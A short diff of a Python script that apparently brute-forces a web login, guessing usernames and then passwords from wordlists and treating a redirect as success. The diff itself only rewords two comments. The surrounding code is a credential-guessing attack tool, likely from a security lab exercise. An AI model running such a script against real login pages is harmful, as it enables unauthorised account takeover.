@@ -4,7 +4,7 @@ import requests
 from termcolor import colored
 
 url = "" # Set the url.
-cookies = {"session": "Jk5tDDf3OdpT59oxvIjkqih8aAfFMuTe"} # Change it with your cookie.
+cookies = {"session": "Jk5tDDf3OdpT59oxvIjkqih8aAfFMuTe"} # Change it with your session value.
 
 def guess_username():
     with open("/PATH/users.txt","r") as file: # Modify it with the users list path.
@@ -37,7 +37,7 @@ def guess_password(username):
             data = {"username": username, "password": password} 
             response = requests.post(url, cookies=cookies, data=data, headers=header)
             
-            # The password will be valid if the direction is happened at least one time in the "history" list of the response during logging in.       
+            # The password will be valid if the redirection is happened at least one time in the "history" list of the response during logging in.       
             if len(response.history) == 1:
                 print(colored(f"[+] Valid password is found... ","green"))
                 return password  
